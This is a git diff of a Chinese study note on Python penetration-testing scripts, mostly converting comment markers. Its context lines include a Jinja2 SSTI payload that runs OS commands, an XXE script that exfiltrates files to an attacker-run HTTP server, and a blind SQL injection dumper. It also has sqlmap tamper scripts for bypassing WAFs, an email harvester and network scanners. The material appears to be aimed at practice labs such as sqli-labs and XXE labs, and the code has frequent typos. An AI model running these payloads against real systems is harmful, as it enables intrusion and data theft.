@@ -139,9 +139,9 @@ else:
 文本文件：常规字符串，由文本行组成，每行通常由换行符'\n'结尾，读取、写入、删除、修改，关闭并保持
 
 open(file[,mode='r'[,buffering=-1]])
-//mode:打开后的处理方式，读模式、写模式、追加模式、二进制模式、文本模式、读写模式
-//buffering:缓存模式，0:不缓存、1:使用行缓存模式、>1:缓存区的大小，默认值为-1；
-//二进制文件和非交互文本文件以固定大小的块为缓冲单位，等价于io
+#mode:打开后的处理方式，读模式、写模式、追加模式、二进制模式、文本模式、读写模式
+#buffering:缓存模式，0:不缓存、1:使用行缓存模式、>1:缓存区的大小，默认值为-1；
+#二进制文件和非交互文本文件以固定大小的块为缓冲单位，等价于io
 ----------------------------------------------------------------------------
 对文件操作：读写、写入、追加、设置二进制模式、文本模式、读写模式
 
@@ -152,14 +152,14 @@ a:追加模式  也是写入模式的一种，不覆盖文件的原始内容
 r: 读模式（默认模式，可省略），文件不存，抛出异常
 +：读写模式
 >>> f = open('demo.txt', 'r')
->>> print(f.readline()) //读取第一行内容
+>>> print(f.readline()) #读取第一行内容
 >>>
->>> print(f.read()) //读取全部
+>>> print(f.read()) #读取全部
 ----------------------------------------------------------------------------
 f.close() //关闭文件对象
 关键字with 能够自动管理资源，总能保证文件正确关闭，并且在代码执行后自动还原开始执行代码块时的现场
 >>> with open('demo.txt','a') as f:
-...     f.write('hello ') //继续追加
+...     f.write('hello ') #继续追加
 ...
 ----------------------------------------------------------------------------
 ```
@@ -246,27 +246,27 @@ import socket
 language = {'what is your name':'I am Tom','how old are you':'25','bye':'bye!'}
 HOST = '127.0.0.1"
 POTR = 6666
-s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) //AF_INET：IPv4，SOCK_STREAM：TCP面向连接
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #AF_INET：IPv4，SOCK_STREAM：TCP面向连接
 s.bind((HOST,PORT))
-s.listen(1) //1表示等待队列最大长度
+s.listen(1) #1表示等待队列最大长度
 print("Listing at port 6666")
-conn,addr = s.accept() //通信套接字，客户端地址=阻塞等待
+conn,addr = s.accept() #通信套接字，客户端地址=阻塞等待
 print('Connect by: ',addr)
-while True: //无限循环接收消息
+while True: #无限循环接收消息
     data = conn.recv(1024)
-    data = data.decode() //解码
+    data = data.decode() #解码
     if not data:
-        break //如果客户端关闭连接,返回空数据
+        break #如果客户端关闭连接,返回空数据
     print('Received message:',data)
 
     conn.sendall(language.get(data,'Nothing').encode())
-    //自动回复;.encode():把字符串变成字节；
-    //language.get("what is your name", "Nothing")；
-    //conn.sendall(b'I am Tom')；
-    //encode() —— 编码：把字符串(str)变成字节(bytes)
+    #自动回复;.encode():把字符串变成字节；
+    #language.get("what is your name", "Nothing")；
+    #conn.sendall(b'I am Tom')；
+    #encode() —— 编码：把字符串(str)变成字节(bytes)
 
-conn.close() //关闭客户端连接
-s.close() //释放端口
+conn.close() #关闭客户端连接
+s.close() #释放端口
 ```
 
 </details>
@@ -287,12 +287,12 @@ except Exception as e:
     print('server not found!')
     sys.exit()
 while True: //无限循环
-    c = input('YOU SAY:') //然后在键盘输入些什么
+    c = input('YOU SAY:') #然后在键盘输入些什么
     s.sendall(c.encode())
     data = s.recv(1024)
     data = data.decode()
     print('Received:',data)
-    if c.lower() == '再见': //.lower()大写转小写
+    if c.lower() == '再见': #.lower()大写转小写
         break
 s.close()
 ```
@@ -478,15 +478,15 @@ def _verify(self):
 <summary>编写攻击模式</summary>
 
 ```
-//用_attack()函数中写入EXP利用脚本，在攻击模式下可以对目标进行getshell、查询管理员账户密码等操作，定义它的方法与检测模式类似
+#用_attack()函数中写入EXP利用脚本，在攻击模式下可以对目标进行getshell、查询管理员账户密码等操作，定义它的方法与检测模式类似
 def _attack(self):
     output = Output(self)
     result = {}
     #攻击代码
-//如果该POC没有攻击模式，可以在_attack()函数下加入return self._verify(),无须再写_attack()函数
+#如果该POC没有攻击模式，可以在_attack()函数下加入return self._verify(),无须再写_attack()函数
 
-//Poscuite框架 填写漏洞 IP地址进行url构造 ---> ‘/?name='
-//判断其返回状态及payload值，200:网页正常请求 484:服务器将url传入的payload正常执行，说明此处存在安全漏洞
+#Poscuite框架 填写漏洞 IP地址进行url构造 ---> ‘/?name='
+#判断其返回状态及payload值，200:网页正常请求 484:服务器将url传入的payload正常执行，说明此处存在安全漏洞
 
 def _verify(self):
     '''verity mode'''
@@ -518,8 +518,8 @@ root@kali:~/pocsuite3-master# pocsuite -r test2.py -u http://127.0.0.1:8000 --ve
 
 ```
 ----------------------------------------------------------------------------
-//EXP脚本的编写POC脚本编写一样，只需要修改_attack部分，替换成漏洞利用的脚本即可
-//Jinja2模版访问python的内置变量并调用时，需要用到python沙盒逃逸方法
+#EXP脚本的编写POC脚本编写一样，只需要修改_attack部分，替换成漏洞利用的脚本即可
+#Jinja2模版访问python的内置变量并调用时，需要用到python沙盒逃逸方法
 
 __bases__:以元组返回一个类所直接继承的类
 __mro__:以元组返回继承关系链
@@ -543,11 +543,11 @@ for c in().__class__.__base__[0].__subclass__():
 '[%27eval%27]("__import__(%27os%27).popen(%27whomi%27.read()")%20%%}%20{%%20endif%20%}%20{%' \
 '%20endfor%20%}
 
-//拆解
+#拆解
 %20{{%20c.__init__.__globals__[%27__builtins__%27][%27eval%27]("__import__(%27os%27).popen(%27whomi%27.read()")%20%%}%20{%%20endif%20%}%20{%%20endfor%20%}
-//再拆解
+#再拆解
 %20{{%20  %20%%}  %20{%%20endif%20%}%20{%%20endfor%20%}
-//再拆解
+#再拆解
 {{  %%}
 
 [1]在{{  %%}这里面的是c.__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")
@@ -745,10 +745,10 @@ import requests
 from bs4 import BeautifulSoup
 import re
 
-//[1]
-//没有异常发送，执行定义的start()函数，通过sys.argv[]实现外部指令的接受。
-//sys.argv[0]表示代码本身的文件路径
-//sys.argv[1:]表示从第一个命令行参数到输入最后一个命令行参数，存储形式为list类型
+#[1]
+#没有异常发送，执行定义的start()函数，通过sys.argv[]实现外部指令的接受。
+#sys.argv[0]表示代码本身的文件路径
+#sys.argv[1:]表示从第一个命令行参数到输入最后一个命令行参数，存储形式为list类型
 
 if __name__ == '__main__':
     #定义异常
@@ -757,11 +757,11 @@ if __name__ == '__main__':
     except  KeyboardInterrupt:
         print("interrupted by user, killing all threads...")
 
-//[2]
-//编写命令行参数处理功能
-//getopt.getopt()函数处理命令行参数，短选项'-字母',长选项'--单词'
-//opts为一个两元组列表，(选项串,附加参数)
-//通过for语句循环输出opts列表中的数值并赋值给自定义的变量
+#[2]
+#编写命令行参数处理功能
+#getopt.getopt()函数处理命令行参数，短选项'-字母',长选项'--单词'
+#opts为一个两元组列表，(选项串,附加参数)
+#通过for语句循环输出opts列表中的数值并赋值给自定义的变量
 
 #主函数，传入用户输入的参数
 def start(argv):
@@ -786,14 +786,14 @@ def start(argv):
             print(usage())
     launcher(url ,pages)
 
-//[3]
-//输出帮助信息
-//开头: \033[显示方式; 前景色 ; 背景色m
-//结尾部分： \033[0m
+#[3]
+#输出帮助信息
+#开头: \033[显示方式; 前景色 ; 背景色m
+#结尾部分： \033[0m
 
-//print('\033[0;30;41m 字样 \033[0m')
+#print('\033[0;30;41m 字样 \033[0m')
 
-//print('\033[0;36;47m 字样 \033[0m')
+#print('\033[0;36;47m 字样 \033[0m')
 
 #banner信息
 def banner()
@@ -809,10 +809,10 @@ def usage():
     sys.exit()
 ##未授权函数检测
 
-//[4]
-//确定搜索邮件的关键字
-//调用bing_search()和baidu_search()两个函数
-//获取的结果进行列表合并，去重之后，循环输出
+#[4]
+#确定搜索邮件的关键字
+#调用bing_search()和baidu_search()两个函数
+#获取的结果进行列表合并，去重之后，循环输出
 
 #漏洞回调函数
 def launcher(url, pages):
@@ -831,10 +831,10 @@ def launcher(url, pages):
                     f.write(email + '\n')
                 email_num.append(email)
 
-//[5]bing搜索引擎
-//bing引擎具有反爬防护，
-//会通过限定referer、cookie等信息确定是否网页爬取操作
-//可以通过指定referer与requests.session()函数自动获取cookie信息，绕过
+#[5]bing搜索引擎
+#bing引擎具有反爬防护，
+#会通过限定referer、cookie等信息确定是否网页爬取操作
+#可以通过指定referer与requests.session()函数自动获取cookie信息，绕过
 
 def bing_search(url, page, key_word):
     referer = "http://cn.bing.com/search?q=email+site%3abaidu.com&qs=n&sp=-1&pq=emailsite%3abaidu.com&first=1&FORM=PERE1"
@@ -845,10 +845,10 @@ def bing_search(url, page, key_word):
     emails = search_emails(r.text)
     return emails
 
-//[6]baidu搜索引擎
-//百度反爬防护：referer和cookie进行校验、在页面中通过JavaScript语句进行动态请求链接，
-//从而导致不能动态获取页面中的信息
-//可以通过，对链接的提取，再进行requests请求
+#[6]baidu搜索引擎
+#百度反爬防护：referer和cookie进行校验、在页面中通过JavaScript语句进行动态请求链接，
+#从而导致不能动态获取页面中的信息
+#可以通过，对链接的提取，再进行requests请求
 
 def baidu_search(url, page, key_word):
     email_list = []
@@ -871,7 +871,7 @@ def baidu_search(url, page, key_word):
             email_list.append(email)
     return email_list
 
-//[7]正则表达获取邮箱密码
+#[7]正则表达获取邮箱密码
 
 def search_email(html):
     emails = re.findall(r"[a-z0-9\.\-+_]+@[a-z0-9\.\-+_]+\.[a-z]+",html,re.I)
@@ -897,12 +897,12 @@ def headers(referer):
 <summary>基于ICMP的主机发现_Scapy库</summary>
 
 ```
-//Internet Control Message Protocol,Internet报文协议)
-//scapy用于发送ping请求和接收目标主机的应答数据
-//差错通知
-//信息查询
-//Scapy库：TCP,UDP,IP,ARP等
-//# python3 -m pip install -i https://pypi.douban.com/simple --pre scapy[complete]
+#Internet Control Message Protocol,Internet报文协议)
+#scapy用于发送ping请求和接收目标主机的应答数据
+#差错通知
+#信息查询
+#Scapy库：TCP,UDP,IP,ARP等
+# python3 -m pip install -i https://pypi.douban.com/simple --pre scapy[complete]
 
 #!/usr/bin/python
 #coding:utf-8
@@ -910,7 +910,7 @@ from scapy.all import *
 from random import randint  
 from optparse import PotionParser 
 
-//将处理后IP地址传入 Scan()函数
+#将处理后IP地址传入 Scan()函数
 def main():
     parser = OptionParser("Usage:%prog -i <target host> ")    #输出帮助信息
     parser.add_option('-i', type='string', dest='IP', help='specify target host')  #获取IP地址参数
@@ -932,13 +932,13 @@ if __name__ == "__main__":
     excetp KeyboardInterrupt:
         print("interrupted by user, killing all threads...")
 
-//Scan()函数调用ICMP
+#Scan()函数调用ICMP
 def Scan(ip):
     ip_id = randint(1, 65535)
     icmp_id = randint(1, 65535)
     icmp_seq = randint(1, 65535)
     packet = IP(dst=ip, ttl=64, id=ip_id)/ICMP(id=icmp_id, seq=icmp_seq)/b'rootkit'
-    result = sr1(packet, timeout=1, verbose=False)   //      verbose=False<----ICMP探测主机存活?!
+    result = sr1(packet, timeout=1, verbose=False)   #   verbose=False<----ICMP探测主机存活?!
     if result:
         for rcv in result:
             scan_ip = rcv[IP].src
@@ -956,8 +956,8 @@ def Scan(ip):
 <summary>基于ICMP的主机发现_Namp库</summary>
 
 ```
-// -sn 只测试该主机的状态
-// -PE 表示使用ICMP
+# -sn 只测试该主机的状态
+# -PE 表示使用ICMP
 
 #!/usr/bin/python3
 # -*- coding: utf-8 -*-
@@ -965,7 +965,7 @@ def Scan(ip):
 import nmap
 import optparse
 
-//将处理后IP地址传入 NampScan函数
+#将处理后IP地址传入 NampScan函数
 if __name__ == '__main__':
     parser = optparse.OptionParser('usage: python %prog -i ip \n\n' 'Example: python %prog -i 192.168.1.1 [192.168.1.1-100]\n')
 
@@ -979,10 +979,10 @@ if __name__ == '__main__':
     else:
         NmapScan(options.targetIP)
 
-//NampScan函数 调用nm.scan()函数，发起ping扫描
-//argusments 为Nmap的扫描参数
-// -sn:使用ping进行扫描
-// -PE:使用ICMP的echo请求包(-pp：使用timestamp参数包，-PM：netmask请求包
+#NampScan函数 调用nm.scan()函数，发起ping扫描
+#argusments 为Nmap的扫描参数
+# -sn:使用ping进行扫描
+# -PE:使用ICMP的echo请求包(-pp：使用timestamp参数包，-PM：netmask请求包
 
 def NmapScan(targetIP):
     # 实例化 PortScanner 对象
@@ -1029,7 +1029,7 @@ from optparse import OptionParser
 from random import randint
 from scapy.all import *
 
-//Scan()函数
+#Scan()函数
 def main():
     usage = "Usage: %prog -i <ip address>"
     parse = OptionParser(usage=usage)
@@ -1045,12 +1045,12 @@ def main():
 if __name__ == '__main__':
     main()
 
-//若flags字段为R，其整型数值为4（REST）
+#若flags字段为R，其整型数值为4（REST）
 def Scan(ip):
     try:
         dport = random.randint(1, 65535)
         packet = IP(dst=ip)/TCP(flags="A",dport=dport)
-        response = sr1(packet, timeout=1.0, verbose=0)  // <----- verbose=0 (上一个是 基于ICMP的主机发现_Scapy库）
+        response = sr1(packet, timeout=1.0, verbose=0)  #<----- verbose=0 (上一个是 基于ICMP的主机发现_Scapy库）
         if response:
             if int(resonse[TCP].flags) == 4:
                 time.sleep(0.5)
@@ -1084,7 +1084,7 @@ def Scan(ip):
 >>> a = sr1(r)
 >>> a.display()
 
-// code= port-unreachable //目标主机存活
+# code= port-unreachable //目标主机存活
 ----------------------------------------------------------------------------
 #!/usr/bin/python
 import time
@@ -1092,7 +1092,7 @@ from optparse import OptionParser
 from random import randint
 from scapy.all import *
 
-//Scan()函数
+#Scan()函数
 def main():
     usage = "Usage: %prog -i <ip address>"
     parse = OptionParser(usage=usage)
@@ -1107,7 +1107,7 @@ def main():
 if __name__ == '__main__':
     main()
 
-// proto字段整型数据为1，目标主机存活
+# proto字段整型数据为1，目标主机存活
 def Scan(ip):
     try:
         dport = random.randint(1, 65535)
@@ -1148,7 +1148,7 @@ result = nm.scan(hosts=targetIP, arguments='-PU')
 <summary>基于ARP的主机发现_Scapu库(Ether && ARP)</summary>
 
 ```
-//ARP中 op 代表消息类型， 1为ARP请求， 2为ARP响应， hwsrc 为 源MAC地址，psrc为 源IP地址， pdst 为 目的IP地址
+#ARP中 op 代表消息类型， 1为ARP请求， 2为ARP响应， hwsrc 为 源MAC地址，psrc为 源IP地址， pdst 为 目的IP地址
 
 #!/usr/bin/python3
 # -*- coding: utf-8 -*-
@@ -1157,21 +1157,21 @@ import re
 import optparse
 from scapy.all import *
 
-//通过正则表达式获取 IP地址和MAC地址
-//re.search利用正则匹配返回第一个成功匹配的结果，存在结果则为true
+#通过正则表达式获取 IP地址和MAC地址
+#re.search利用正则匹配返回第一个成功匹配的结果，存在结果则为true
 def HostAddress(iface):
 
-    ipData = os.popen('ifconfig ' + iface)   //os.popen执行后返回执行结果
-    dataLine = ipData.readlines()     //对ipData进行类型转换，再用正则进行匹配
-    if re.search('\w\w:\w\w:\w\w:\w\w:\w\w:\w\w', str(dataLine)): //取MAC地址
-        MAC = re.search('\w\w:\w\w:\w\w:\w\w:\w\w:\w\w', str(dataLine)).group(0) //取出匹配结果
-        if re.search(r((2[0-4]\d|25[0-5]|[01]?\d\d?)\.){3}(2[0-4]\d|25[0-5]|[01]?\d\d?)', str(dataLine)): //取IP地址
+    ipData = os.popen('ifconfig ' + iface)  #os.popen执行后返回执行结果
+    dataLine = ipData.readlines()     #对ipData进行类型转换，再用正则进行匹配
+    if re.search('\w\w:\w\w:\w\w:\w\w:\w\w:\w\w', str(dataLine)): #取MAC地址
+        MAC = re.search('\w\w:\w\w:\w\w:\w\w:\w\w:\w\w', str(dataLine)).group(0) #取出匹配结果
+        if re.search(r((2[0-4]\d|25[0-5]|[01]?\d\d?)\.){3}(2[0-4]\d|25[0-5]|[01]?\d\d?)', str(dataLine)): #取IP地址
             IP = re.search(r'((2[0-4]\d|25[0-5]|[01]?\d\d?)\.){3}(2[0-4]\d|25[0-5]|[01]?\d\d?)', str(dataLine)).group(0)
     addressInfo = (IP,MAC)
 return addressInfo
 
-//编写ARP探测函数,自动生成目标进行探测
-//发送ARP包，因为要用到OSI的二层和三层，所以要写成Ether/ARP,因为最低层用到了二层，所以要用srp()发包
+#编写ARP探测函数,自动生成目标进行探测
+#发送ARP包，因为要用到OSI的二层和三层，所以要写成Ether/ARP,因为最低层用到了二层，所以要用srp()发包
 def ArpScan(iface = 'eth0'):
     mac = HostAddress(iface)[1] //通过HostAddress返回的元组取出MAC
     ip =  HostAddress(iface)[0] //取出IP地址
@@ -1254,7 +1254,7 @@ class PortScaner(threading.Thread):
                 s.settimeout(self._timeout)
                 result_code = s.connect_ex((self._ip, port))
                 # sys.stdout.write("[%d]Scan\n" % port)
-                if result_code == 0:  \\若端口开放，则会放回0
+                if result_code == 0:  #若端口开放，则会放回0
                     sys.stdout.write("[%d] OPEN\n" % port)
             excetp Exception as e:
                 print(e)
@@ -1270,18 +1270,18 @@ def StartScan(targetip, port, threadNum):
     else:
         portList.append(int(port))
     ip = targetip
-    threads = [] //线程列表
-    threadNumber = threadNum //线程数量
-    portQueue = queue.Queue() //队列端口
+    threads = [] #线程列表
+    threadNumber = threadNum #线程数量
+    portQueue = queue.Queue() #队列端口
 
-    for port in portList: //生成端口，加入端口队列
+    for port in portList: #生成端口，加入端口队列
         portQueue.put(port)
     for t in range(threadNumber):
         threads.append(PortScaner(portQueue, ip, timeout=3))
 
-    for thread in threads: //启动线程
+    for thread in threads: #启动线程
         thread.start()
-    for thread in threads: //阻塞线程
+    for thread in threads: #阻塞线程
         thread.join()
 
 if __name__ == '__main__':
@@ -1321,7 +1321,7 @@ import time
 import socket
 import re
 
-SIGNS = (  //SIGNS值文库，用于对目标主机返回的banner信息进行匹配
+SIGNS = (  #SIGNS值文库，用于对目标主机返回的banner信息进行匹配
     # 协议 | 版本 | 关键字
     b'FTP|FTP|^220.*FTP',
     b'MYSQL|MySQL|mysql_native_password',
@@ -1360,9 +1360,9 @@ if __name__ == "__main__":
     except KeyboardInterrupt:
         print("interrupted by user, killing all threads...")
 
-//在request()函数，调用sock.connect()函数探测目标主机端口是否开放
-//利用sock.sendall()函数将PROBE探针发送给目标端口
-//sock.recv()函数用于接收返回的指纹信息，并将指纹信息及端口发送到regex()函数
+#在request()函数，调用sock.connect()函数探测目标主机端口是否开放
+#利用sock.sendall()函数将PROBE探针发送给目标端口
+#sock.recv()函数用于接收返回的指纹信息，并将指纹信息及端口发送到regex()函数
 def request(ip, port):
     response = ''
     PROBE = 'GET / HTTP/1.0\r\n\r\n'
@@ -1381,8 +1381,8 @@ def request(ip, port):
         pass
     sock.close()
 
-//利用re.search()函数将返回的banner信息与SIGNS包含的指纹信息进行正则匹配，并将匹配结果输出
-//没有在SIGNS中找到相匹配的信息，则输出Unrecognized
+#利用re.search()函数将返回的banner信息与SIGNS包含的指纹信息进行正则匹配，并将匹配结果输出
+#没有在SIGNS中找到相匹配的信息，则输出Unrecognized
 def regex(response, port):
     text = ""
     if re.search(b'<title>502  Bad Gateway', response):
@@ -1419,8 +1419,8 @@ def regex(response, port):
 <summary>系统识别</summary>
 
 ```
-//windows TTL 128
-//Linux TTL 64
+#windows TTL 128
+#Linux TTL 64
 
 #!/usr/bin/python3.7
 #!coding:utf-8
@@ -1438,7 +1438,7 @@ def main():
 if __name__ == "__main__":
     main()
 
-//调用os.popen()函数执行ping命令，并将返回的结果通过正则表达式识别re.compile()
+#调用os.popen()函数执行ping命令，并将返回的结果通过正则表达式识别re.compile()
 def ttl_scan(ip):
     ttlstrmatch = re.compile(r'ttl=\d+')
     ttlnummatch = re.compile('r\d+')
@@ -1476,13 +1476,13 @@ result = nm.scan(hosts = targetIP, arguments = '-O')
 <summary>敏感目录探测</summary>
 
 ```
-//先导入requests模块，等待用户输入url和字典
+#先导入requests模块，等待用户输入url和字典
 import requests
 headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0) Gecko/20100101 Firefox/6.0" }
 url = input("url: ")
 txt = input('php.txt;)
 
-//当用户没有输入字典时，默认打开根目录的php.txt，然后将字典中的内容放进队列中
+#当用户没有输入字典时，默认打开根目录的php.txt，然后将字典中的内容放进队列中
 url_list = []
 if txt == "":
     txt = "php.txt"
@@ -1495,7 +1495,7 @@ try:
 except:
     print("error! ")
 
-//将队列中的内容拼接到url中组成需要验证的地址，通过返回值判断是否存在此目录
+#将队列中的内容拼接到url中组成需要验证的地址，通过返回值判断是否存在此目录
 for li in url_list:
     conn = "http://" + url + "/" + li
 
@@ -1729,7 +1729,7 @@ def usage():
 //运行
 // # python3 redis_unauthorized_access.py -h
 
-//利用recvdata()函数接收目标主机返回的数据，当返回的数据含有'redis version'字符串时，表明存在未授权访问漏洞，否则不存在
+#利用recvdata()函数接收目标主机返回的数据，当返回的数据含有'redis version'字符串时，表明存在未授权访问漏洞，否则不存在
 ## 为授权函数检测
 def redis_unanthoried(url, port):
     result = []
@@ -1844,8 +1844,8 @@ def output_exec(output,type):
 %send;
 ]>
 
-//点击发送数据包，就可以在VPS上看到HTTP反问记录
-// # tail -f /var/log/apache2/access.log
+#点击发送数据包，就可以在VPS上看到HTTP反问记录
+//# tail -f /var/log/apache2/access.log
 ----------------------------------------------------------------------------
 ```
 
@@ -1885,14 +1885,14 @@ def ExportPayload(lop, lport):
     file.close()
     print("[*] Payload文件创建成功!")
 
-//编写HTTP服务函数，通过http.server模块实现HTTP服务，监听目标服务器返回的数据
+#编写HTTP服务函数，通过http.server模块实现HTTP服务，监听目标服务器返回的数据
 def StartHTTP(lip,lport):
     serverAddr = (lip, lport)
     httpd = HTTPServer(serverAddr, MyHandler) //创建服务器对象
     print("[*] 正在开启HTTP服务器:\n\n===================\nIP地址：{0}\n端口：{1}\n============\n".format(lip, lport))
     httpd.serve_forever()    //让HTTP服务器一直运行，不听等待别人访问
 
-//编写PORT发送函数，用来向目标服务器发送攻击数据
+#编写PORT发送函数，用来向目标服务器发送攻击数据
 def SendData(lip, lport, url):
     filePath = "c:\\test.txt"
     while True:
@@ -1904,9 +1904,9 @@ def SendData(lip, lport, url):
         filePath = input("Input filePath:")
 
 class MyHandler(SimpleHTTPRequestHandler):
-    def log_message(self, format, *args):  //重写父类的方法
+    def log_message(self, format, *args):  #重写父类的方法
 
-        sys.stderr.write("%s - - [%s] %s\n" %  //终端输出HTTP访问信息
+        sys.stderr.write("%s - - [%s] %s\n" %  #终端输出HTTP访问信息
             (self.client_address[0],
             self.log_date_time_string(),
             format%args))
@@ -1924,10 +1924,10 @@ if __name__ == '__main__':
     url = "http://192.168.1.130/xxe-lab/php_xxe/doLogin.php"
     Export Payload(lip, lport)
 
-    threadHTTP = threading.Thread(target=StartHTTP, args=(lip, lport)) //HTTP服务线程
+    threadHTTP = threading.Thread(target=StartHTTP, args=(lip, lport)) #HTTP服务线程
     threadHTTP.start()
 
-    threadPOST = threading.Thread(target=SendData, args=(lip, lport, url)) //发送POST数据线程
+    threadPOST = threading.Thread(target=SendData, args=(lip, lport, url)) #发送POST数据线程
     threadPOST.start()
 
 //运行
@@ -1994,9 +1994,9 @@ select password from users
 
 条件成立 → 返回1,条件不成立 → 返回0
 
-if(length(database())=8,1,0) //数据库名长度是不是8？
+if(length(database())=8,1,0) #数据库名长度是不是8？
 
-ascii(substr(database(),1,1))=115  //数据库第1个字符是不是 s ?
+ascii(substr(database(),1,1))=115  #数据库第1个字符是不是 s ?
 拆开 database -->   security
 substr(database(),1,1)  -->    s
 ascii('s')  --> 115
@@ -2020,9 +2020,9 @@ import optparse
 DBName = ""
 DBTable = []
 DBColumns = []
-DBData = {} //{字段名,数据列表}
+DBData = {} #{字段名,数据列表}
 
-flag = "You are in ...."  //若页面返回真
+flag = "You are in ...."  #若页面返回真
 
 # 设置重连次数以及将连接改为短连接
 # 防止 因为HTTP连接次数过多导致的 Max retries exceeded with url 问题
@@ -2030,7 +2030,7 @@ requests.adapters.DEFAULT_RETRIES = 5
 conn = requests.session()
 conn.keep_alive = False
 
-// 盲注主函数
+# 盲注主函数
 def StartSqli(url):
     GetDBName(url)
     print("[+] 当前数据库名:{0}".format(DBName))
@@ -2051,7 +2051,7 @@ def StartSqli(url):
         else:
             GetDBData(url, DBTables[tableIndex], DBColumns[columnIndex])
 
-//编写获取数据库的函数，根据得到的URL获取数据库名并把最后的结果存入DBName ---逐位枚举 数据库的长度、数据库名
+#编写获取数据库的函数，根据得到的URL获取数据库名并把最后的结果存入DBName ---逐位枚举 数据库的长度、数据库名
 def GetDBName(url):
     global DBName
     print("[-] 开始获取数据库名的长度")
@@ -2067,15 +2067,15 @@ def GetDBName(url):
     payload = "'and if(ascii(substr(database(),{0},1))={1},1,0) %23"
     targetUrl = url + payload
 
-    for a in range(1, DBNameLen + 1):  // a表示 substr()函数的截取起始位置
-        for b in range(33, 127):    //b表示在ASCII码中33-126位可显示的字符
+    for a in range(1, DBNameLen + 1):  # a表示 substr()函数的截取起始位置
+        for b in range(33, 127):    #b表示在ASCII码中33-126位可显示的字符
             res = conn.get(targerUrl.format(a,b))
             if flag in res.content.decode("utf-8"):
                 DBName += chr(b)
                 print("[-]" + DBName)
                 break
 
-//编写获取数据库表的函数，根据获取到的URL和数据库名获取数据中的表，并把结果以列表的形式存入DBTables:
+#编写获取数据库表的函数，根据获取到的URL和数据库名获取数据中的表，并把结果以列表的形式存入DBTables:
 def GetDBTables(url, dbname):
     global DBTables
     DBTableCount = 0
@@ -2111,7 +2111,7 @@ def GetDBTables(url, dbname):
           DBTables.append(table)
           table = ""
 
-//编写获取表字段的函数，根据获取的URL、数据库名和数据表，获取表的字段并把结果以列表的形式存入DBColumns
+#编写获取表字段的函数，根据获取的URL、数据库名和数据表，获取表的字段并把结果以列表的形式存入DBColumns
 def GetDBCloums(url, dbname, datable):
     global DBColums
     DBColumnCount = 0
@@ -2145,7 +2145,7 @@ def GetDBCloums(url, dbname, datable):
         DBColumns.append(column)
         column = ""
 
-//编写数据获取函数，根据获取第URL、数据表名和数据表字段来获取数据。数据以字典的形式存放，键为字段名，值为字段数据形成的列表：
+#编写数据获取函数，根据获取第URL、数据表名和数据表字段来获取数据。数据以字典的形式存放，键为字段名，值为字段数据形成的列表：
 def GetDBData(url, dbtable, dbcolumn):
     global DBData
     print("[-]开始获取{0}表{1}字段的数据数量".format(dbtable, dbcolumn))
@@ -2180,7 +2180,7 @@ def GetDBData(url, dbtable, dbcolumn):
         print(DBData)
         data = ""
 
-//编写主函数，用来获取目标的URL并传递给StarTSqli:
+#编写主函数，用来获取目标的URL并传递给StarTSqli:
 if __name__ == '__main__':
     parser = optparse.OptionParser('usage: python %prog -u url \n\n' 'Example:python %prog -u http://192.168.61.1/sql/Less-8/?id=1\n')
     (options, agrs) = parser.parse_args()
@@ -2274,14 +2274,14 @@ SQLMap的提供了57个Tamper脚本，绕过IDS/WAF的检测
 
 #!/usr/bin/env python
 from lib.core.enums import PRIORITY
-__poriority__ = PRIORITY.LOW     //定义脚本的优先级
+__poriority__ = PRIORITY.LOW    #定义脚本的优先级
 
 def dependencies():
     pass
 
-// 对传进来的payload进行修改并返回，函数有两个参数。
-// 主要更改的是payload参数，kwargs参数用得不多。
-// 官方提供的Tamper脚本两次更改http-header
+# 对传进来的payload进行修改并返回，函数有两个参数。
+# 主要更改的是payload参数，kwargs参数用得不多。
+# 官方提供的Tamper脚本两次更改http-header
 
 def tamper(payload, **kwargs):
     # 增加相关的payload处理，再将payload返回
@@ -2296,7 +2296,7 @@ def tamper(payload, **kwargs):
 <summary>绕过目标网站 防SQL注入系统的Tamper脚本</summary>
 
 ```
-//格式  preg_replace(正则表达式, 替换内容, 原字符串)
+#格式  preg_replace(正则表达式, 替换内容, 原字符串)
 
 function blacklist($id)
 {
@@ -2333,7 +2333,7 @@ import re
 from lib.core.enums import PRIORITY //LOW,NORMAL,HIGH
 __priority__ = PRIORITY.NORMAL
 
-def dependencies():  //脚本描述函数
+def dependencies():  #脚本描述函数
     pass
 
 def tamper(payload, **kwargs):
@@ -2435,9 +2435,108 @@ def tamper(payload, **kwargs):
     if payload:
         retVal = re.sub(r"(?!)count\(\*\)", r"count(1)",payload)
     return retVal
+
+//运行
+>>> sqlmap -u "http://IP/sqli/Less-26/?id=1" -v 3 --tamper "double-and-or.py, space2A0.py, count.py" -D "sericuty" -T "users" -C "username,password" --dump
+```
+
+</details>
+
+<details>
+<summary>针对WAF编写Tamper脚本绕过</summary>
+
+```
+----------------------------------------------------------------------------
+//安全狗的绕过方法
+空格 ->       /*!*/
+=  ->        /*!*/=/*!*/
+AND  ->      /*!*/AND/*!*/
+UNION  ->    union/*!88888cas*/
+#  ->        /*!*/#
+USER()  ->   USER/*!()*/
+DATABASE()-> DATABASE/*!()*/
+--    ->     /*!*/--
+SELECT    -> /*!88888cas*/select
+FROM   ->    /*!99999c*//*!99999c*/from
+----------------------------------------------------------------------------
+//拦截关键字替换
+
+#!/usr/bin/env python
+from lib.core.enums import PRIORITY
+from lib.core.settings import UNICODE_ENCODING
+
+__priority__ = PRIORITY.NORMAL
+
+def dependencies():
+    pass
+
+def tamper(payload, **kwargs):
+    if payload:
+        payload = payload.replace("UNION", "union/*!88888cas*/")
+        payload = payload.replace("--", "/*!*/--")
+        payload = payload.replace("SELECT", "/*!88888cas*/select")
+        paylaod = payload.replace("FROM", "/*!99999c//*!99999c*/from")
+        payload = payload.replace("#", "/*!*/#")
+        payload = payload.replace("USER()","USER/*!()*/")
+        payload = payload.replace("DATABASE()", "DARABASE/*!()*/")
+        payload = payload.replace(" ", "/*!*/")
+        payload = payload.replace("=", "/*!*/=/*!*/")
+        payload = payload.replace("AND", "/*!*/AND/*!*/")
+    return payload
+
+----------------------------------------------------------------------------
+//运行
+>>> sqlmap -u "http://IP/sqli/Less-4/?id=1" --tamper "Bypass.py" -v 3 --dbs
+>>> sqlmap -u "http://IP/sqli/Less-4/?id=1" --tamper "Bypass.py" -v 3 -D "security" -tables
